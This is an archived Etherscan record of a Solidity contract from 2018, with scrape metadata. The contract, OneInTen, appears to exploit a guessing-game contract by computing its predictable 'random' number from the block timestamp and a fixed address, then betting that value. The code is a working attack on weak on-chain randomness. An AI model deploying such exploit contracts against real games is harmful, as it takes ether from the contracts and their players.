//token_name	
//token_url	https://etherscan.io//address/0x51e6263bef3970485b1545d4ca181749d9b19875#code
//spider_time	2018/07/08 12:33:17
//token_Transactions	1 txn
//token_price	

pragma solidity ^0.4.20;

contract LuckyNumber {
  function takeAGuess(uint8 _myGuess) public payable {}
}

contract OneInTen {
  function call(address contract_address) public payable {
    LuckyNumber(contract_address).takeAGuess.value(msg.value)(uint8(keccak256(now, address(0xd777c3F176D125962C598E8e1162E52c6C403606)))%10);
  }
}